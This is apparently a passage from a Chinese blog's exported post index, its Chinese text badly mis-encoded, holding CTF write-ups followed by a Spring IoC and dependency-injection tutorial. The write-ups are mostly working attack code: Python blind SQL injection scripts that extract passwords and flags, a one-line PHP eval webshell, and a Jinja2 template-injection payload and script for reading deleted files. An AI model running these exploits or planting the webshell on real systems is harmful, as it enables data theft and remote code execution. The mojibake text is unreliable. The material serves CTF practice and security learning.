è¿‡äº†éå¸¸éå¸¸ä¹…æ‰å‡ºæ¥..å…¶å®å»ºè®®ç”¨äºŒåˆ†æ³•è„šæœ¬ï¼š 123456789101112131415161718192021import requestsurl = &quot;http://a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&quot;payload = &quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;result = &quot;&quot;for i in range(1,100): l = 1 r = 130 mid = (l + r)&gt;&gt;1 while(l&lt;r): payloads = payload.format(i,mid) # print(url+payloads) html = requests.get(url+payloads) if &quot;JFIF&quot; in html.text: l = mid +1 else: r = mid mid = (l + r)&gt;&gt;1 result+=chr(mid) print(result) å†ä¹‹åæ˜¯åˆ©ç”¨çŸ­æ ‡ç­¾ä¸Šä¼ PHPæ–‡ä»¶ é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬ä¹Ÿè¦æ³¨æ„åˆ°çš„æ˜¯ä»–è¿™é‡Œæ˜¯å°†ä½ çš„filenameå†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸‹é¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†ä¸€å¥è¯å†™é“è¿™ä¸ªæ–‡ä»¶ä¸‹é¢ 1&lt;?=eval($_POST[1]);?&gt;","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"2020ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›","slug":"2020ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›","date":"2020-11-14T08:34:25.000Z","updated":"2020-11-17T06:03:38.282Z","comments":true,"path":"2020/11/14/2020ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›/","link":"","permalink":"http://example.com/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"æ³¨å…¥æ¯ï¼Œæ„Ÿè§‰ä¹Ÿæ˜¯è‡ªé—­çš„ä¸€å¤©orz,åƒåœ¾æ–‡ç« ï¼Œåªä¸è¿‡æ˜¯è®°å½•ä¸€ä¸‹è„šæœ¬ åƒæ¯’ç½‘ç›˜ 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30258901&#x2F;article&#x2F;details&#x2F;96605162 åœ¨è¿™ä¸ªğŸ”—ä¸‹æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°çš„ï¼åˆ©ç”¨æ¯”è¾ƒç®€å•ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦çš„å‚æ•°åœ¨getä¸Šï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹ï¼š 123?code = xx_GET[code] =xxåªéœ€è¦ä¸¤è€…ä¿æŒä¸€è‡´å³å¯ å¦‚æœåœ¨POSTä¸Šï¼Œåˆ™åè¿‡æ¥ï¼š 12?_POST[code] =xxcode =xx ç”±äº$$key_2 == $value_2ä½¿å¾—POSTçš„å€¼è¢«unsetäº†ï¼Œç»•è¿‡wafï¼Œåé¢å†æ¬¡extracté€ æˆå˜é‡è¦†ç›– ç„¶åæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œè¿™é‡Œç”¨â€“+ä»£æ›¿#ï¼Œä¸ç„¶ä¼šå‡ºç°é”™è¯¯æƒ…å†µ é˜Ÿé‡Œå¸ˆå‚…çš„è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334import requestsimport stringurl=&quot;http://eci-2zehpt4jc1z3f9vgcraf.cloudeci1.ichunqiu.com/index.php&quot;text=&#x27;&#x27;proxies=&#123;&#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;,&#x27;https&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;headers = &#123; &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125;for i in range(1,200): l=28 h=126 while abs(h - l) &gt; 1: m=(l+h)/2 pay=&quot;select flag from flag&quot; #pay=&quot;database()&quot; e = &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m) data = &quot;code=114514&#x27;and if((&#123;&#125;),1,0)--+&quot;.format(e) #print(data) #print(url+&quot;?_POST[code]=&quot;+data[&#x27;code&#x27;]) re=requests.post(url+&quot;?_POST[code]=&quot;+data.strip(&#x27;code=&#x27;),data=data,headers=headers) #print(re.text) #print(data) #exit() if &#x27;http://gamectf.com/p/CGBU.png&#x27; in re.text: l=m else: h=m mid_num = int((l + h + 1) / 2) text += chr(int(h)) print(text) TryToLoginè¿™é“é¢˜ç›®æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³¨å…¥ï¼Œæ„Ÿè§‰æœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹,sprintf 12345678910111213141516171819202122232425262728import requestsimport stringurl&#x3D;&quot;http:&#x2F;&#x2F;eci-2ze4elsbeer15p6dsvx2.cloudeci1.ichunqiu.com&#x2F;index.php&quot;text&#x3D;&#39;&#39;proxies&#x3D;&#123;&#39;http&#39;:&#39;127.0.0.1:8080&#39;,&#39;https&#39;:&#39;127.0.0.1:8080&#39;&#125;headers &#x3D; &#123; &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;for i in range(1,200): l&#x3D;28 h&#x3D;126 while abs(h - l) &gt; 1: m&#x3D;(l+h)&#x2F;2 pay&#x3D;&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot; pay&#x3D;&quot;select * from fl4g&quot; e &#x3D; &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m) data &#x3D;&quot;password&#x3D;%1$&#39;||if((&#123;&#125;),1,0)--+&quot;.format(e)+&#39;&amp;username&#x3D;admin&#39; re&#x3D;requests.post(url,data&#x3D;data,headers&#x3D;headers) if &#39;ç™»å½•æˆåŠŸäº†&#39; in re.text: l&#x3D;m else: h&#x3D;m text +&#x3D; chr(int(h)) print(text) SSTI123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask,request,render_templatefrom jinja2 import Templateimport osapp = Flask(__name__)f = open(&#x27;/flag&#x27;,&#x27;r&#x27;)flag = f.read()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def home(): name = request.args.get(&quot;name&quot;) or &quot;&quot; print(name) if name: return render_template(&#x27;index.html&#x27;,name=name) else: return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])def help(): help = &#x27;&#x27;&#x27; &#x27;&#x27;&#x27; return f.read()@app.errorhandler(404)def page_not_found(e): #No way to get flag! os.system(&#x27;rm -f /flag&#x27;) url = name = request.args.get(&quot;name&quot;) or &quot;&quot; r = request.path r = request.data.decode(&#x27;utf8&#x27;) if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: t = Template(&quot; Not found!&quot;) return render_template(t), 404 t = Template(r + &quot; Not found!&quot;) return render_template(t), 404if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8888) è¿™é“é¢˜æ¯”è¾ƒæ–°æœ‰æ„æ€çš„ç‚¹åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼š è¿‡æ»¤äº†è¿™ä¸ªåœ°æ–¹ 1if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: è¿‡æ»¤äº†å·¦å³èŠ±æ‹¬å·,è¿™æ ·å­çš„æƒ…å†µä»¥å‰è‡ªå·±æ²¡æœ‰é‡è¿‡ï¼Œåæ¥çŸ¥é“å¯ä»¥è¿›è¡Œç›²æ³¨ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶çš„payloadå¦‚ä¸‹ï¼š 1&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125; å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¼šè¾“å‡ºp0ï¼Œå¦åˆ™å°±ä¸ä¼šè¾“å‡ºã€‚ç¬¬äºŒç‚¹ï¼Œæˆ‘ä»¬è¯¥è¯»å–ä»€ä¹ˆæ–‡ä»¶å‘¢ï¼Ÿ è¿™é‡Œè¿ç”¨äº†os.system(â€œrm -f /flagâ€) é»˜è®¤çš„è¿›ç¨‹åˆ é™¤åä¼šå­˜æ”¾åœ¨æš‚æ—¶æ–‡ä»¶ä¸­ï¼Œè¿›ç¨‹ä¸ºï¼š 1/proc/self/fd/3 æ•…ç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516171819202122import requestsimport stringurl = &#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;def check(payload): r = requests.post(url, data=payload,headers=headers).text return &#x27;~p0~&#x27; in rpassword = &#x27;&#x27;sa=string.printable#print(s)for i in range(0,100): for c in sa: payload=&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27; + str(i) + &#x27;:&#x27; + str( i + 1) + &#x27;] == &quot;&#x27; + c + &#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) if check(payload): password += c break print(password)","categories":[],"tags":[]},{"title":"Springå­¦ä¹ ","slug":"Springå­¦ä¹ ","date":"2020-11-10T13:58:01.000Z","updated":"2020-11-17T06:09:39.491Z","comments":true,"path":"2020/11/10/Springå­¦ä¹ /","link":"","permalink":"http://example.com/2020/11/10/Spring%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Springä»ä»Šå¤©å¼€å§‹å­¦Sping1.IOCç†è®ºæ¨å¯¼ï¼š UserDaoæ¥å£ UserDaomplå®ç°ç±» Userserviceä¸šåŠ¡æ¥å£ UserServiceimpl ä¸šåŠ¡å®ç°ç±» åœ¨ä¹‹å‰çš„ä¸šåŠ¡å½“ä¸­ï¼Œç”¨æˆ·çš„éœ€æ±‚ä¼šä¿®æ”¹æˆ‘ä»¬çš„ä»£ç ï¼Œå¯¼è‡´ä»£ç éš¾ä»¥ç»´æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¼€å§‹ä½¿ç”¨äº†setå€¼æ¤å…¥ï¼Œsetæ¥å£ï¼Œå®ç°ä¸ç”¨ä¿®æ”¹ä»£ç ï¼Œç”¨æˆ·åªéœ€è¦è°ƒç”¨æ¥å£å°±å¯ä»¥äº†ã€‚ 123456789public class UserServiceimp1 implements UserService &#123; private UserDao userDao = new UserDaolmp1(); public void getUser()&#123; userDao.getuser(); &#125;&#125; å…ˆå‰çš„ä»£ç ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨UserDaoçš„æ—¶å€™å› ä¸ºå†™æ­»äº†æ‹“å±•ï¼Œæ‰€ä»¥æ— æ³•çµæ´»çš„è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¥å£çš„æ€æƒ³è§£æ”¾ 123456789 public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; public void getUser()&#123; userDao.getuser(); &#125;&#125; â€‹ æˆ‘ä»¬å°†ä¹‹å‰å†™æ­»çš„ä»£ç è½¬å˜æˆäº†setæ–¹æ³•ï¼Œè¿™æ ·å­å½“æˆ‘ä»¬äºmainæ–¹æ³•å½“ä¸­ä½¿ç”¨çš„æ—¶å€™ï¼š 12345678910public class MyTest &#123; public static void main(String[] args) &#123; UserServiceimp1 userService = new UserServiceimp1(); userService.setUserDao(new UserDaoMysql()); userService.getUser();// ç”¨æˆ·å®é™…è°ƒç”¨ä¸šåŠ¡å±‚ï¼Œdaoå±‚ä¸éœ€è¦æ¥è§¦ &#125;&#125; ç”¨æˆ·åªéœ€è¦åœ¨setåé¢æ›´æ”¹æ¥å£å°±å¯ä»¥äº†ï¼ IOCçš„ä¸‰å±‚æ¶æ„ï¼šDaoå±‚è´Ÿè´£å®ç°æ–¹æ³•ï¼ŒServiceå±‚è´Ÿè´£è°ƒç”¨Daoçš„æ–¹æ³•ï¼Œè€Œmainæ–¹æ³•å»è°ƒç”¨Serviceçš„æ¥å£ ä½¿ç”¨è¯¥æ–¹æ³•å¤§å¤§é™ä½äº†ä¸šåŠ¡çš„è€¦åˆæ€§ï¼Œä½¿å¾—ä¸šåŠ¡çš„æ¯ä¸€éƒ¨åˆ†ä¸“å¿ƒäºåšå¥½è‡ªå·±çš„æ¶æ„å³å¯ã€‚ 2.IOCçš„æœ¬è´¨â€‹ æ§åˆ¶åè½¬IoC(Inversion of Control),æ˜¯ä¸€ç§è®¾è®¡æ€æƒ³ï¼ŒDI(ä¾èµ–æ³¨å…¥)æ˜¯å®ç°IoCçš„ä¸€ç§æ–¹æ³•ï¼Œä¹Ÿæœ‰äººè®¤ä¸ºDIåªæ˜¯IoCçš„å¦-ç§è¯´æ³•ã€‚ æ²¡æœ‰IoCçš„ç¨‹åºä¸­ ,æˆ‘ä»¬ä½¿ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹ ,å¯¹è±¡çš„åˆ›å»º ä¸å¯¹è±¡é—´çš„ä¾èµ–å…³ç³»å®Œå…¨ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ï¼Œå¯¹è±¡çš„åˆ›å»ºç”±ç¨‹åºè‡ªå·±æ§åˆ¶ï¼Œæ§åˆ¶åè½¬åå°†å¯¹è±¡çš„åˆ›å»ºè½¬ç§»ç»™ç¬¬ä¸‰æ–¹ï¼Œä¸ªäººè®¤ä¸ºæ‰€è°“æ§åˆ¶åè½¬å°±æ˜¯:è·å¾—ä¾èµ–å¯¹è±¡çš„æ–¹å¼åè½¬äº†ã€‚ â€‹ è€ŒIOCå°±æ˜¯Springçš„æ ¸å¿ƒæ€æƒ³ï¼ 3.HelloSpringé¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç±»ï¼š 12345678910111213141516public class HelloSpring &#123; private String str; public String getStr() &#123; return str; &#125; public void setStr(String str) &#123; this.str = str; &#125; public String tostring() &#123; return &quot;hello&quot;+&quot;str=&quot;+str+&#x27;\\&#x27;&#x27;; &#125;&#125; åˆ›å»ºbeans.xmlï¼Œå†™å…¥å¦‚ä¸‹ï¼š 12345&lt;!-- ä½¿ç”¨springåˆ›å»ºå¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡éƒ½ç§°ä¸ºbean--&gt;&lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;Spring&quot;/&gt; &lt;!-- å±æ€§--&gt;&lt;/bean&gt; åœ¨è¿™é‡Œï¼ŒSpringå¸®æˆ‘ä»¬åšäº†è¿™ä¹ˆä¸€ä¸ªäº‹æƒ…ï¼š åœ¨javaå½“ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºç±»çš„æ—¶å€™éƒ½æ˜¯ ç±» å¯¹è±¡å = new å¯¹è±¡ï¼› è€Œåœ¨Springå½“ä¸­ï¼Œidä¸ºæ³¨å†Œçš„å¯¹è±¡åï¼Œpropertyå½“ä¸­å³å¯è°ƒç”¨ç±»å½“ä¸­çš„æ–¹æ³•ï¼Œvalueç”¨äºç»™æ–¹æ³•çš„å˜é‡èµ‹å€¼ã€‚ 12345678910public class Mytest &#123; public static void main(String[] args) &#123;// è·å–springçš„ä¸Šä¸‹æ–‡å¯¹è±¡ ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯ HelloSpring hello = (HelloSpring) context.getBean(&quot;hello&quot;); System.out.println(hello.tostring()); &#125;&#125; é‡ç‚¹å°±æ˜¯ä¸€åˆ‡äº¤ç»™Springï¼Œä¸€åˆ‡å‡½æ•°ä¸å†ç”±ä½ è°ƒç”¨ï¼Œè®©Springè°ƒç”¨å³å¯ã€‚ 4.IOCåˆ›å»ºå¯¹è±¡â€‹ 1.é»˜è®¤ç›´æ¥åˆ›å»ºçš„æ—¶å€™åˆ©ç”¨çš„æ— å‚æ„é€ æ–¹æ³• â€‹ 2.æœ‰å‚æ„é€ çš„æ—¶å€™æˆ‘ä»¬æœ‰ä¸‰ç§æ–¹å¼æ¥å¯¹å‚æ•°è¿›è¡Œæ„é€ ï¼š 123456&lt;!-- é”®å¯¹å€¼çš„æ–¹å¼ï¼Œæœ€ç®€å•--&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;wuhu&quot;/&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;wuhu&quot;/&gt; &lt;!-- ç”¨ä¸‹æ ‡æ¥èµ‹å€¼--&gt; &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;wuhu&quot;/&gt; &lt;!-- ç”¨ç±»å‹æ¥èµ‹å€¼ï¼Œä¸æ¨èä½¿ç”¨--&gt; æ³¨æ„äº‹é¡¹: â€‹ åœ¨Springå½“ä¸­ï¼Œå®é™…ä¸Šå½“æˆ‘ä»¬åˆ©ç”¨Springè¿›è¡ŒContextçš„åˆ›å»ºçš„æ—¶å€™ï¼ŒSpringå·²ç»å°†å…¨éƒ¨å¯¹è±¡å¯¼å…¥ 1234ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯HelloSpring hello = (HelloSpring) context.getBean(&quot;hello&quot;);System.out.println(hello.tostring()); ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ çš„Beanå½“ä¸­å³ä½¿å«æœ‰å¤šä¸ªç±»ï¼ŒSpringä¹Ÿå°†ä»–ä»¬å…¨éƒ¨å¯¼å…¥å¹¶åˆå§‹åŒ–ï¼Œç”¨æˆ·æƒ³è¦ä»€ä¹ˆå»å–å‡ºæ¥å³å¯ã€‚ 5.Springçš„é…ç½® åˆ«å(å·²æ²¡ç”¨äº†) Beançš„é…ç½® 12&lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot; name=&quot;u1,u2&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;www&quot;/&gt; åœ¨è¿™é‡Œçš„idå°±æ˜¯æ³¨å†Œåï¼Œclasså°±æ˜¯è°ƒç”¨ç±»nameå·²ç»å¯ä»¥å–åˆ«åäº†ï¼ Import ä¾¿äºå¤šäººè¿åŠ¨ï¼Œå¤§ä¼™ä¸€èµ·å¼€å‘çš„æ—¶å€™ï¼Œå°±å¯ä»¥å°†ä»–ä»¬åŒ…å«åœ¨ä¸€èµ·äº†~ 1&lt;import resource=&quot;beans.xml&quot;/&gt; 6.DIä¾èµ–æ³¨å…¥â€‹ 6.1æ„é€ æ–¹æ³•æ³¨å…¥â€‹ é‡å†™æ„é€ æ–¹æ³• 6.2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘â€‹ ä¾èµ–ï¼šbeansçš„å¯¹è±¡ä¾èµ–äºå®¹å™¨ï¼ â€‹ æ³¨å…¥ï¼šbeadå½“ä¸­çš„æ‰€æœ‰å±æ€§Â·ï¼Œç”±å®¹å™¨æ¥æ³¨å…¥ã€‚ ã€ç¯å¢ƒæ­å»ºã€‘ â€‹ 1.å¤æ‚ç±»å‹ 2.çœŸå®æµ‹è¯•å¯¹è±¡ 123456789public class Student &#123; private String string; private String[] book; private List&lt;String&gt; hobbies; private Map&lt;String,String&gt; card; private Set&lt;String&gt; games; private String wife; private Properties info; â€‹ 3.beans.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!-- æ™®é€šæ³¨å…¥--&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot; name=&quot;u1,u2&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;www&quot;/&gt;&lt;!-- refæ³¨å…¥--&gt; &lt;/bean&gt; &lt;bean id=&quot;address2&quot; class=&quot;com.ysllz.pojo.Address&quot; /&gt; &lt;bean class=&quot;com.ysllz.pojo.Student&quot; id=&quot;student&quot;&gt;&lt;!--æ•°ç»„æ³¨å…¥--&gt; &lt;property name=&quot;book&quot;&gt; &lt;array&gt; &lt;value&gt;çº¢æ¥¼æ¢¦&lt;/value&gt; &lt;value&gt;æ°´æµ’ä¼ &lt;/value&gt; &lt;value&gt;ä¸‰å›½æ¼”ä¹‰&lt;/value&gt; &lt;value&gt;è¥¿æ¸¸è®°&lt;/value&gt; &lt;/array&gt; &lt;/property&gt;&lt;!--listæ³¨å…¥--&gt; &lt;property name=&quot;hobbies&quot;&gt; &lt;list&gt; &lt;value&gt;èµ·é£&lt;/value&gt; &lt;value&gt;èµ·é£&lt;/value&gt; &lt;value&gt;èµ·é£&lt;/value&gt; &lt;value&gt;èµ·é£&lt;/value&gt; &lt;/list&gt; &lt;/property&gt;&lt;!-- mapæ³¨å…¥--&gt; &lt;property name=&quot;card&quot;&gt; &lt;map&gt; &lt;entry key=&quot;èº«ä»½è¯&quot; value=&quot;440000000032001&quot;/&gt; &lt;entry key=&quot;é“¶è¡Œå¡&quot; value=&quot;2213123032001&quot;/&gt; &lt;/map&gt; &lt;/property&gt;&lt;!-- setæ³¨å…¥--&gt; &lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;lol&lt;/value&gt; &lt;value&gt;cod&lt;/value&gt; &lt;value&gt;bot&lt;/value&gt; &lt;/set&gt; &lt;/property&gt; &lt;property name=&quot;wife&quot; &gt;&lt;null/&gt;&lt;/property&gt;&lt;!-- é…ç½®æ³¨å…¥--&gt; &lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;username&quot;&gt;351452024&lt;/prop&gt; &lt;prop key=&quot;password&quot;&gt;3125224&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; â€‹ 4.æµ‹è¯•ç±» 12345678910public class Mytest &#123; public static void main(String[] args) &#123;// è·å–springçš„ä¸Šä¸‹æ–‡å¯¹è±¡ ApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);// æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯ Student student = (Student) context.getBean(&quot;student&quot;); System.out.println(student.toString()); &#125;&#125; 6.3å…¶ä»–æ–¹æ³•æ³¨å…¥P,å°±æ˜¯setæ³¨å…¥ï¼ŒCå°±æ˜¯åˆ›é€ å™¨æ³¨å…¥ 1.Springçš„beançš„æœ¬è´¨å®é™…ä¸Šå°±æ˜¯åè½¬ï¼Œæ³¨å…¥çš„å€¼ï¼Œåˆ›å»ºå¯¹è±¡å…¨éƒ¨äº¤ç»™Springçš„XMLæ¥é…ç½®äº†ï¼å®é™…ä¸Šå°±æ˜¯åˆ©ç”¨Setæ³¨å…¥ å›é¡¾æ˜¨å¤©çš„ä»£ç ï¼š 123456789//æˆ‘ä»¬ç…§æ ·æ˜¯new äº†ä¸€ä¸ªæ–°çš„å¯¹è±¡package com.ys.dao;public class UserSQLServer implements UserDao &#123; public void getUser() &#123; System.out.println(&quot;SQLSERVER use it&quot;); &#125;&#125; é‡å†™DAOå±‚çš„æ–¹æ³•ï¼Œä¹‹ååœ¨serviceå±‚å½“ä¸­è¿›è¡Œæ“ä½œï¼š 12345package com.ys.service;public interface UserService &#123; void getUser();&#125; å†™ä¸€ä¸ªå®ç°æ¥å£ç±»ï¼š 1234567891011121314151617181920package com.ys.service;import com.ys.dao.UserDao;public class UserServiceimpl implements UserService&#123; private UserDao userDao; public UserDao getUserDao() &#123; return userDao; &#125; public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; public void getUser() &#123; this.userDao.getUser(); &#125;&#125; ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªSetæ–¹æ³•ï¼Œè®©userDaoå…è®¸ç”¨æˆ·çš„è‡ªå®šä¹‰åˆ›å»ºï¼Œé‚£ä¹ˆä»–éœ€è¦ä»€ä¹ˆæˆ‘ä»¬å°±ç»™ä»€ä¹ˆ~ æœ€ç»ˆæµ‹è¯•ç±»ï¼š 12345678910111213141516171819import com.ys.dao.UserDao;import com.ys.dao.UserDaoimpl;import com.ys.dao.UserMysql;import com.ys.dao.UserSQLServer;import com.ys.service.UserService;import com.ys.service.UserServiceimpl;public class TestInMine &#123; public static void main(String[] args) &#123;// ç”¨æˆ·å®é™…è°ƒç”¨çš„æ˜¯ä¸šåŠ¡å±‚ï¼ŒDaoå±‚ä¸å…è®¸ä»–ä»¬æ¥è§¦ï¼ UserServiceimpl userServiceimpl = new UserServiceimpl(); userServiceimpl.setUserDao(new UserSQLServer()); userServiceimpl.getUser();&#125;&#125; äºæ˜¯åœ¨springå½“ä¸­ï¼Œspringå¸®æˆ‘ä»¬æ“ä½œäº†ä»€ä¹ˆï¼Ÿ æˆ‘ä»¬æ²¡æœ‰NEWä»»ä½•ä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬åšçš„æ˜¯å»Springçš„beanä¸‹é…ç½®xml~ æˆ‘ä»¬å¦‚ä¸‹æ„é€ xmlï¼š 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;!-- ä½¿ç”¨springæ¥åˆ›å»ºæˆ‘ä»¬çš„å¯¹è±¡,åœ¨springä¸­éƒ½æˆä¸ºBean--&gt; &lt;!-- ç°åœ¨ä¸€ä¸ªBeanç›¸å½“äºnew äº†ä¸€ä¸ªå¯¹è±¡--&gt; &lt;!-- æˆ‘ä»¬åœ¨XMLå½“ä¸­å»é…ç½®äº†--&gt; &lt;bean id=&quot;userMySQL&quot; class=&quot;com.ys.dao.UserMysql&quot;/&gt; &lt;bean id=&quot;userOranle&quot; class=&quot;com.ys.dao.UserOranle&quot;/&gt; &lt;bean id=&quot;userSQLServer&quot; class=&quot;com.ys.dao.UserSQLServer&quot;/&gt; &lt;bean id=&quot;userServiceimpl&quot; class=&quot;com.ys.service.UserServiceimpl&quot;&gt; &lt;property name=&quot;userDao&quot; ref=&quot;userMySQL&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; bean å°±ç›¸å½“äºnewäº†è¿™ä¹ˆä¸€ä¸ªç±»ï¼Œrefåˆ™æ˜¯å–beanå½“ä¸­å·²ç»åˆ›å»ºå¥½çš„ç±»ã€‚ æ‰€ä»¥æˆ‘ä»¬çš„æµ‹è¯•ä»£ç ä¿®æ”¹åä¸ºï¼š 1234567891011121314import com.ys.service.UserServiceimpl;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class TestInMine &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean1.xml&quot;); UserServiceimpl userServiceimpl = (UserServiceimpl) context.getBean(&quot;userServiceimpl&quot;); userServiceimpl.getUser(); &#125;&#125; 2 IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼1.ä½¿ç”¨æ— å‚æ„é€  é»˜è®¤åˆ›å»º 123456789101112131415161718192021222324package com.ys.pojo;public class User &#123; private String name;// public User()&#123;//// System.out.println(&quot;wdndmd&quot;);//// &#125; public User(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void show()&#123; System.out.println(&quot;name:&quot;+name); &#125;&#125; å¦‚æœæˆ‘åœ¨è¿™ç›´æ¥å°†æ— å‚æ„é€ å»é™¤ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°æ— æ³•æ„å»ºçš„é—®é¢˜ï¼Œä½†æ˜¯Springä¹Ÿæ”¯æŒä½¿ç”¨æœ‰å‚æ„é€  æ„é€ å™¨å‡½æ•°æœ‰ä¸‰ç§æ–¹å¼ï¼š ç¬¬ä¸€ç§ï¼Œä¸‹æ ‡èµ‹å€¼ &lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;wdnmd&quot;/&gt; &lt;/bean&gt; 1234567+ ç¬¬äºŒç§ï¼Œå‚æ•°ç±»å‹åŒ¹é…+ &#96;&#96;&#96;xml &lt;bean id&#x3D;&quot;user&quot; class&#x3D;&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg type&#x3D;&quot;java.lang.String&quot; value&#x3D;&quot;www&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; é€šè¿‡å‚æ•°åæ¥è¿›è¡Œèµ‹å€¼ 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;www&quot;/&gt;&lt;/bean&gt; è¦æ³¨æ„ï¼š æˆ‘ä»¬å¦‚æœä½¿ç”¨äº†æœ‰å‚æ„é€ ï¼Œspringå°±ä¸ä¼šèµ°æ— 